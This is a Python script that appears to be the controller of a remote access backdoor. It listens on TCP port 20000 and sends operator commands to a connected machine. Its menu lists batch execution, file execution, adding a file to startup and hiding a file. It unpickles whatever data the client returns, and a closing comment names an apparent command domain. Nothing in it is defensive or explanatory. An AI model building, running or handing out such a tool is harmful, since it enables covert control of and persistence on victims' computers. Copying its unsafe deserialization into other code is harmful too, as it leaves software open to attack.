import socket
from pickle import loads


class Socket:

    header = 10
    established = False

    def __init__(self):
        self.socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.socket.bind(("", 20000))
        self.listen_to_for_client()

    def listen_to_for_client(self):
        try:
            print("Listening...")
            self.socket.listen(1)
            self.connection, self.address = self.socket.accept()
            self.established = True
            print(f"Connection established with {self.address}")
        except socket.timeout:
            self.established = False

    def send_command(self, command):
        command = command.encode()
        try:
            self.connection.send(command)
        except ConnectionResetError:
            self.established = False
            print(f"Lost connection to {self.address}")
            return False
        if "-batch" in command.decode():
            return
        self.receive_command_output()

    def receive_command_output(self):
        full_msg = b''
        new_msg = True
        while True:
            try:
                msg_rec = self.connection.recv(64)
            except (ConnectionAbortedError, ConnectionResetError, TimeoutError):
                self.established = False
                print(f"Lost connection to {self.address}")
                return False
            if new_msg:
                msg_len = int(msg_rec[:self.header])
                new_msg = False
            full_msg += msg_rec
            if len(full_msg) - self.header == msg_len:
                full_msg = loads(full_msg[self.header:])
                print(full_msg)
                return True


connection = Socket()
print("\nexecute batch: -batch [args] [script(new line = /n)]")
print("execute file: -e")
print("startup file -s")
print("hide file -h")
while True:
    if not connection.established:
        connection.listen_to_for_client()
    print("\nEnter command:")
    user_input = input("> ")
    connection.send_command(user_input)


# uhblajkil.cf
# Verbindung fixen


